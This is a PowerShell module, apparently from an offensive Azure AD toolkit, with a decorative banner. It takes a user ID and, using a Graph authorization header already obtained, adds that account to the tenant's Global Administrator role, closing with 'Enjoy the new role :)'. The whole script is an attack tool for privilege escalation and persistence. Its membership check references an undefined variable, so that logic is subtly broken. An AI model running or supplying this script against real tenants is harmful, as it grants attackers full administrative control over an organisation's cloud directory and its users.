
Write-host "+======================================================================================+" -ForegroundColor Blue
Write-Host @("
    @@@@@@@@@@@@#G55PG#@@@@@@@@@@@@@@@@
    @@@@@@@@@#J!~^^^^^~!J#@@@@@@@@@@@@@
    @@@@@@@@Y~~~~!!!!!~~~~5@@@@@@@@@@@@
    @@@@@@@B~!!!!!!!!!!!!!~#@@@@@@@@@@@
    @@@@@@@G!7777777777777!B@@@@@@@@@@@
    @@@@@@@@J7???????????7Y@@@@@@@@@@@@
    @@@@@@@@@GJJJJJJJJJJYB@@@@@@@@@@@@@
    @@@@@@@@#P?^^!777!^~JB&@@@@@@@@@@@@") -ForegroundColor Cyan -NoNewline
Write-Host "    [*] Add AzureAD Global Admin [*]" -ForegroundColor Yellow -NoNewline
Write-Host @(" 
    @@@@@#J~^^~^       ^~^~75J^~JB@@@@@
    @@@&J~~~~~~!~     ~~^:........:~5&@
    @@&7~!!!!!!!!^   ~!!:::.......::^7@
    @@?!7777777777: ^77!^^^^::.:~!777?@
    @G7777777777777!7777^^:::..^^~!!!?@
    @J7????????????????7^......^::::~Y@
    @#5YYYYYYYYYYYYYYYYYYJ7~^..:^!Y#@@@
    @@@@@@@@@@@@@@@@@@@@@@@@@&5G&@@@@@@
   ") -ForegroundColor Cyan
Write-host "+======================================================================================+" -ForegroundColor Blue

$userToGA = Read-Host "[+] Please insert the User Id"
$gaEndpoint = "/directoryRoles?`$filter=roleTemplateId eq '62e90394-69f5-4237-9190-012177145e10'&`$select=id"
try {
  $gaIdData = Invoke-RestMethod -Uri ($msGraphEndpoint + $gaEndpoint) -Headers $HttpAuthHeader -Method Get
}
Catch {
  Write-Error $Error[0]
}

$globalAdminId = ($gaIdData | select-object Value).Value.id

$globalAdminMembersEndpoint = "/directoryRoles/$($globalAdminId)/members?`$select=id,userPrincipalName"
try {
  $globalAdminMembers = Invoke-RestMethod -Uri ($msGraphEndpoint + $globalAdminMembersEndpoint) -Headers $HttpAuthHeader -Method Get
}
Catch {
  Write-Error $Error[0]
}
if ($globalAdminMembers -contains $userToAddToGa) {
  Write-Host "[=] $($userToGA) is already Member of the GA Role" -ForegroundColor Cyan
} 
else { 
  Write-Host "[+] Adding User $($userToGA) to Global Admin" -ForegroundColor Cyan
  $body = @{
    "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/$($userToGA)"
  }
  $azADGAEndpoint = "/directoryRoles/$($globalAdminId)/members/`$ref"
  try {
    Invoke-RestMethod -Uri ($msGraphEndpoint + $azADGAEndpoint) -Headers $HttpAuthHeader -Method POST -Body $($body | ConvertTo-Json) -ContentType 'application/json' | Out-Null
  } 
  Catch {
    Write-Error $Error[0]
  }
  Write-Host "  [+] Enjoy the new role :)" -ForegroundColor Magenta
}
Read-Host "[+] Press any key to main menu"
Menu